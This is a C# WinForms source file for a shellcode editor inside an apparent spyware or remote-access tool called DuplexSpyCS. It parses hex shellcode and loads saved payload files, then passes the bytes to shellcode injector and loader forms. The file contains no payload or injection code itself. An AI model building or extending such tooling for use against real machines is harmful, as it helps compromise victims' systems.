using ICSharpCode.TextEditor;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmEditorShellcode : Form
    {
        private frmTaskShellcodeInjector m_frmInjector { get; init; }
        private frmShellcodeLoader m_frmShellcode { get; init; }

        private byte[] m_abShellCode
        {
            get
            {
                if (m_frmInjector == null)
                    return m_frmShellcode.m_abShellCode;
                else
                    return m_frmInjector.m_abShellCode;
            }
            set
            {
                if (m_frmInjector == null)
                    m_frmShellcode.m_abShellCode = value;
                else
                    m_frmInjector.m_abShellCode = value;
            }
        }

        private string m_szDir { get { return Path.Combine(Application.StartupPath, "Shellcodes"); } }

        public frmEditorShellcode(frmTaskShellcodeInjector frmInjector)
        {
            InitializeComponent();

            m_frmInjector = frmInjector;
            Text = "Shellcode Editor";
        }

        public frmEditorShellcode(frmShellcodeLoader frmShellcode)
        {
            InitializeComponent();

            m_frmShellcode = frmShellcode;
            Text = "Shellcode Editor";
        }

        void fnSave()
        {
            fnFormatting();

            string hexString = richTextBox1.Text;
            List<byte> bytes = new List<byte>();

            toolStripComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;

            foreach (Match m in Regex.Matches(hexString, @"\\x([0-9a-fA-F]{2})"))
            {
                bytes.Add(Convert.ToByte(m.Groups[1].Value, 16));
            }

            byte[] byteArray = bytes.ToArray();

            m_abShellCode = byteArray;

            Close();
        }

        void fnFormatting()
        {
            string szShellcode = richTextBox1.Text;
            richTextBox1.Text = szShellcode.
                Replace("unsigned", string.Empty).
                Replace("char", string.Empty).
                Replace("buf[]", string.Empty).
                Replace("\"", string.Empty).
                Replace("\'", string.Empty).
                Replace("\n", string.Empty).
                Replace("=", string.Empty).
                Replace(" ", string.Empty).
                Replace(";", string.Empty).
                Replace(Environment.NewLine, string.Empty);
        }

        void fnLoad()
        {
            byte[] abShellcode = m_abShellCode;
            if (abShellcode == null || abShellcode.Length == 0)
                return;

            string szShellcode = BitConverter.ToString(abShellcode).Replace("-", @"\x");
            richTextBox1.Text = szShellcode;
        }

        void fnSetup()
        {
            if (!Directory.Exists(m_szDir))
            {
                MessageBox.Show("Directory not found: " + m_szDir, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (m_abShellCode != null && m_abShellCode.Length != 0)
                toolStripComboBox1.Items.Add("<Custom>");

            foreach (string szFileName in Directory.GetFiles(m_szDir))
                toolStripComboBox1.Items.Add(Path.GetFileNameWithoutExtension(szFileName));

            toolStripComboBox1.SelectedIndex = 0;
        }

        private void frmEditorShellcode_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.S)
                {
                    fnSave();
                }
            }
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            fnSave();
        }

        private void toolStripComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (string.Equals("<Custom>", toolStripComboBox1.Text))
            {

                return;
            }

            string szFilePath = Path.Combine(m_szDir, toolStripComboBox1.Text) + ".txt";
            if (!File.Exists(szFilePath))
            {
                MessageBox.Show("File not found: " + szFilePath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            richTextBox1.Text = File.ReadAllText(szFilePath);
            fnFormatting();
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            fnFormatting();
        }
    }
}
